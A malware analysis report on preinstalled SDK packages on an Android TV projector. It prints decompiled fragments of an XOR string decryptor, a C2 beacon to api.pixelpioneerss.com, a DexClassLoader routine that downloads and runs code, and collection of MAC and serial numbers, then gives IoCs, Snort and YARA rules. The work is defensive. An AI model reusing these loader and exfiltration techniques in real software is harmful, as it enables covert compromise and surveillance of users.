# Technical Deep-Dive: Android Projector Malware Analysis

## 1. Device Information

```
Model: ADT-3 (Android TV Developer Kit)
Brand: ADT-3
Device: adt3
Android Version: 11 (API 30)
Root Status: Rooted via Magisk
Connection: ADB over network (192.168.0.104:5555)
```

## 2. Discovery of Malicious Packages

Initial investigation revealed 6 disabled system packages:
```
pm list packages -d
package:com.htc.eventuploadservice
package:com.hotack.silentsdk
package:com.htc.expandsdk
package:com.htc.htcotaupdate
package:com.android.nfc
package:com.htc.storeos
```

All "htc" and "hotack" prefixed packages were analyzed.

---

## 3. SilentSDK Analysis (com.hotack.silentsdk)

### 3.1 Manifest Analysis
```xml
android:sharedUserId="android.uid.system"  <!-- SYSTEM privileges -->
android:usesCleartextTraffic="true"        <!-- Allows HTTP -->
```

**Key Components:**
- `MyApplication` - Initializes C2 connection
- `MyService` - Foreground service (systemExempted)
- `BootReceiver` - Priority 999 boot receiver
- `BootStartActivity` - Custom boot action handler

**Dangerous Permissions:**
- INTERNET, ACCESS_NETWORK_STATE
- READ_PHONE_STATE
- READ/WRITE_EXTERNAL_STORAGE
- RECEIVE_BOOT_COMPLETED
- CHANGE_NETWORK_STATE, CHANGE_WIFI_STATE
- READ_CALL_LOG (granted as SYSTEM)
- RECOVERY, WRITE_SETTINGS
- DOWNLOAD_WITHOUT_NOTIFICATION

### 3.2 String Obfuscation

The malware uses XOR-based string encryption in `a.a.g()`:

```java
public static String g(byte[] bArr, byte[] bArr2) {
    int length = bArr.length;
    int length2 = bArr2.length;
    int i3 = 0;
    int i4 = 0;
    while (i3 < length) {
        if (i4 >= length2) {
            i4 = 0;
        }
        bArr[i3] = (byte) (bArr[i3] ^ bArr2[i4]);
        i3++;
        i4++;
    }
    return new String(bArr);
}
```

**Decrypted Strings:**
| Encrypted Call | Decrypted Value |
|----------------|-----------------|
| `g({-99,127,58,...}, {-4,15,83,...})` | `api.pixelpioneerss.com` |
| `g({125,61,58,...}, {21,73,78,...})` | `https://` |
| `g({0,90,58,...}, {104,46,78,...})` | `http://` |
| `g({-79,-8,-113,...}, {...})` | `dalvik` |
| `g({-35,58,-33,...}, {...})` | `system` |
| `g({69,-57,-10}, {...})` | `Dex` |
| `g({39,91,-127,...}, {...})` | `ClassLoader` |

### 3.3 C2 Communication Flow

**Initialization (MyApplication.onCreate):**
```java
String strG = a.g(new byte[]{35, -3, -58, -76},
                  new byte[]{69, -52, -10, -123, -40, 11, -17, 93});
// Decrypts to C2 identifier
fVar2.c(strG, str, dVar);
```

**Network Request (b/n.java):**
```java
// C2 URL construction
public static final String f2391d = a.a.g(
    new byte[]{-99, 127, 58, -103, -71, -77, 85, 98, -112, 127, 58, -40, -89, -65, 72, 117, -113, 124, 125, -44, -90, -73},
    new byte[]{-4, 15, 83, -73, -55, -38, 45, 7}
);
// Decrypts to: api.pixelpioneerss.com

// URL builder
public static String b(String str) {
    String strG = a.a.g(...); // "https://"
    // Falls back to "http://" if SSL fails
    ...
    return strG + str + "/" + randomSuffix;
}
```

**Request Payload (JSON):**
```json
{
  "a": "<device_id>",
  "b": "<app_key>",
  "c": "<package_name>",
  "d": <version_id>,
  "f": "<device_fingerprint>",
  "h": <sdk_version>
}
```

### 3.4 Dynamic Code Loading

**DexClassLoader Usage (b/k.java):**
```java
// Constructs: dalvik.system.DexClassLoader
Class<?> cls = Class.forName(e(10) + "." + e(4) + "." + e(1) + e(5));

// Target class loaded dynamically
// com.me.cash5.OoO0OOo
String targetClass = e(13) + "." + e(14) + "." + e(21) + "." + e(11);
```

**File Download and Execution:**
```java
// Downloads payload to cache
a.a.h(str, fileA);

// Makes file executable
Runtime.getRuntime().exec("chmod 777 " + filePath);

// Loads via DexClassLoader
// Invokes method with (Context, Bundle) signature
```

### 3.5 Persistence Mechanisms

**Boot Receiver (Priority 999):**
```java
public final void onReceive(Context context, Intent intent) {
    if (Build.VERSION.SDK_INT >= 26) {
        context.startForegroundService(new Intent(context, MyService.class));
    } else {
        context.startService(new Intent(context, MyService.class));
    }
}
```

**Network Callback:**
```java
public final void onAvailable(Network network) {
    NetworkInfo networkInfo = myService.f3822b.getNetworkInfo(network);
    if (networkInfo != null && networkInfo.isConnected() && networkInfo.isAvailable()) {
        // Triggers C2 communication when network becomes available
    }
}
```

---

## 4. ExpandSDK Analysis (com.htc.expandsdk)

### 4.1 Configuration
```xml
<meta-data android:name="tcl_app_key"
           android:value="vuvGkRo2rFMm2dYu6+A+SpOQT+qv440loOrf2kzW6vKop+K+liGYJfgVL8Zm2IYna2GwLBalIlVz36LGd/dAQA=="/>
<meta-data android:name="partner_name" android:value="htk"/>
```

### 4.2 C2 Endpoint
```java
// ExpandSdkService.java:96
return "http://pb-api.aodintech.com/api/collections/addialog/records?filter=" +
       URLEncoder.encode("(channel='" + str + "'&&scene='" + str2 + "')", "UTF-8");
```

### 4.3 Functionality
- Fetches ad configuration from C2
- Uses TCL's VastAd SDK (`com.tcl.ff.component.vastad.Ad`)
- Displays dialog overlays using SYSTEM_ALERT_WINDOW
- Can kill background processes

---

## 5. EventUploadService Analysis (com.htc.eventuploadservice)

### 5.1 C2 Endpoint
```java
// URL.java
public static final String REPORT_URL = "http://event-api.aodintech.com/report";
```

### 5.2 Data Collection
```java
// EventManager.java - Data collected:
reportBean.setModel(getSystemProperties("persist.sys.modelName", "project"));
reportBean.setVersion(getHtcDisplay());
reportBean.setChannel(getSystemProperties("persist.sys.Channel", "project"));
reportBean.setDeviceId(getWan0Mac());  // MAC address
reportBean.setDeviceSn(getSystemProperties("ro.serialno", "unknown"));
```

### 5.3 MAC Address Harvesting
```java
// Constants.java
public static String getWan0Mac() {
    BufferedReader br = new BufferedReader(new FileReader(
        new File("/sys/class/net/wlan0/address").exists()
            ? "/sys/class/net/wlan0/address"
            : "/sys/class/addr_mgt/addr_wifi"
    ));
    return br.readLine();
}
```

---

## 6. StoreOS Analysis (com.htc.storeos)

### 6.1 C2 Endpoints
```java
// l3/a.java and MainActivity.java
"http://store-api.aodintech.com/sign/app/update/check"
"http://store-api.aodintech.com/app/install/report"
"http://store-api.aodintech.com/sign/app/list"
"http://store-api.aodintech.com/channel/check"
```

### 6.2 Capabilities
- Checks for app updates from C2
- Reports installed applications
- Can silently install apps (runs as SYSTEM)
- Channel-based targeting

---

## 7. Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                     DEVICE BOOT                                  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  BootReceiver (Priority 999) starts MyService                   │
│  Package: com.hotack.silentsdk                                  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  NetworkCallback triggers on connectivity                       │
│  Initiates C2 communication                                     │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  POST device info to api.pixelpioneerss.com                     │
│  - Device ID, Package name, SDK version                         │
│  - Receives: DEX download URL, version, hash                    │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  Download DEX payload                                           │
│  chmod 777, verify hash                                         │
│  Load via DexClassLoader                                        │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  Execute: com.me.cash5.OoO0OOo                                  │
│  (Unknown payload capabilities)                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 8. Indicators of Compromise (IoCs)

### 8.1 Network Indicators
```
# C2 Domains
api.pixelpioneerss.com
pb-api.aodintech.com
event-api.aodintech.com
store-api.aodintech.com

# Known Endpoints
POST /report
GET /api/collections/addialog/records
POST /sign/app/update/check
POST /app/install/report
GET /sign/app/list
GET /channel/check
```

### 8.2 File Indicators

**SHA256 Hashes:**
```
e5a193c31526a2194d04a2157321d490d68f9251fab1cbbd28c2580971396fb7  silentsdk.apk
500c0422fe097aad71c2157b0350db36af18e012a4c2a819433c044192bac161  expandsdk.apk
214df467a32cb355e9a877dff91d14807d65e14cac257d05fdc6a14d549a2141  eventuploadservice.apk
21209911e55c1418f88d25c60e55558164fc168a00f5b6865f9ef5ecbaf27dc0  storeos.apk
8fa01b3e2de8f1b058d52b1ff12a10d94943f195fdf6bcd20e0fb15a18d9109b  htcotaupdate.apk
```

**Package Names:**
```
com.hotack.silentsdk
com.htc.expandsdk
com.htc.eventuploadservice
com.htc.storeos
com.htc.htcotaupdate
```

### 8.3 Android Indicators
```
# SharedPreferences
Preference file: silentsdk_prefs
Keys: version_id, last_update, download_url

# Boot Actions
android.intent.action.BOOT_COMPLETED (priority 999)
com.htc.bootstart

# Service Names
com.hotack.silentsdk.MyService
com.htc.expandsdk.ExpandSdkService
com.htc.eventuploadservice.EventService
```

### 8.4 Code Signatures
```
# XOR Encryption Pattern
a.a.g(byte[], byte[])

# DexClassLoader Usage
dalvik.system.DexClassLoader

# Target Class
com.me.cash5.OoO0OOo

# Bundle Parameter Methods
method.invoke(null, context, bundle)
```

---

## 9. MITRE ATT&CK Mapping

| Technique ID | Technique Name | Description |
|--------------|----------------|-------------|
| T1059 | Command and Scripting Interpreter | Shell commands via Runtime.exec() |
| T1071 | Application Layer Protocol | HTTP/HTTPS C2 communication |
| T1132 | Data Encoding | XOR string encryption |
| T1547 | Boot or Logon Autostart | Boot receiver persistence |
| T1027 | Obfuscated Files | ProGuard obfuscation |
| T1055 | Process Injection | DexClassLoader code loading |
| T1082 | System Information Discovery | Device info collection |
| T1083 | File and Directory Discovery | File system access |
| T1005 | Data from Local System | MAC address, serial number |
| T1041 | Exfiltration Over C2 Channel | Telemetry exfiltration |

---

## 10. Remediation

### Immediate Actions
1. Block C2 domains at network perimeter
2. Disable/uninstall identified packages
3. Factory reset device if compromise suspected

### Detection Rules

**Network Detection (Snort/Suricata):**
```
alert http any any -> any any (msg:"Android Malware C2 - pixelpioneerss";
  content:"api.pixelpioneerss.com"; http_host; sid:1000001;)

alert http any any -> any any (msg:"Android Malware C2 - aodintech";
  content:"aodintech.com"; http_host; sid:1000002;)
```

**YARA Rule:**
```yara
rule Android_SilentSDK_Dropper {
    meta:
        description = "Detects SilentSDK Android dropper"
        author = "Malware Analyst"
        date = "2026-01-16"
    strings:
        $pkg = "com.hotack.silentsdk"
        $c2 = "pixelpioneerss"
        $class = "OoO0OOo"
        $xor_func = { 8B 00 30 01 }
    condition:
        2 of them
}
```

---

*Analysis Date: 2026-01-16*
*Tools Used: ADB, JADX, Python, Android SDK*
